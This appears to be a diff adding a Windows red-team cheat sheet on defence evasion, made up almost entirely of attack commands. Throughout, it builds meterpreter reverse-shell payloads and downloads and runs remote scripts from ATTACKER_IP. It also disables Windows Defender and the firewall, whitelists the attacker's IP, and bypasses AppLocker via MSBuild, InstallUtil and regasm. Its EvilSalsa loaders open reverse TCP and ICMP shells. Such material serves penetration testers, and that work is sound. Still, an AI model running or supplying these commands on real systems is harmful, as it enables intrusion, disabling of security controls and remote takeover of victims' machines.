@@ -1,0 +1,77 @@
+# Bypass Evasion
+# https://morph3sec.com/Cheat-Sheets/Windows-Red-Team-Cheat-Sheet/
+
+## Ebowla
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.133 LPORT=9001 -f exe > shell.exe
+./ebowla.py shell.exe genetic.config
+./build_x64_go.sh output/go_symmetric_shell.exe.go morph3-ebowla.exe
+    An example genetic.config env variable
+        [[ENV_VAR]]
+            username = 'morph3'
+            computername = ''
+            homepath = ''
+            homedrive = ''
+            Number_of_processors = ''
+            processor_identifier = ''
+            processor_revision = ''
+            userdomain = 'acme'
+            systemdrive = ''
+            userprofile = ''
+            path = ''
+            temp = ''
+
+## Powershell Constrained Language Bypass
+powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+PSByPassCLM
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.ex
+
+## Windows Defender
+sc config WinDefend start= disabled
+sc stop WinDefend
+# Powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+# Remove definitions
+"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+## Firewall
+Netsh Advfirewall show allprofiles
+NetSh Advfirewall set allprofiles state off
+
+## Ip Whitelisting
+New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+
+## Applocker ByPass
+https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
+https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md
+
+# Multistep process to bypass applocker via MSBuild.exe:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.56 LPORT=9001  -f csharp -e x86/shikata_ga_nai -i  > out.cs 
+
+# Replace the buf-sc and save it as out.csproj
+https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml
+Invoke-WebRequest "http://ATTACKER_IP/payload.csproj" -OutFile "out.csproj"; C:\windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe .\out.csproj
+;; or you can simply use this tool :)
+https://github.com/morph3/Msbuild-payload-generator
+sudo python msbuild_gen.py -a x86 -i 10 --lhost 192.168.220.130 --lport 9001 -m
+
+## GreatSCT
+;; This also needs Veil-Framework
+python GreatSCT.py --ip 192.168.1.56 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload1.exe
+python3 GreatSCT.py -t Bypass -p regasm/meterpreter/rev_tcp --ip 192.168.1.56 --port 9001
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
+
+## EvilSalsa
+#Preparing payloads
+python EncrypterAssembly/encrypterassembly.py EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt
+EncrypterAssembly.exe EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt
+#Executing payload
+SalseoLoader.exe password http://ATTACKER_IP/evilsalsa.dll.txt reversetcp ATTACKER_IP 9001
+# Reverse icmp shell
+python icmpsh_m.py "ATTACKER_IP" "VICTIM_IP"
+SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp ATTACKER_IP
+
+## Changing Permissions of a file
+icacls text.txt /grant Everyone:F
+
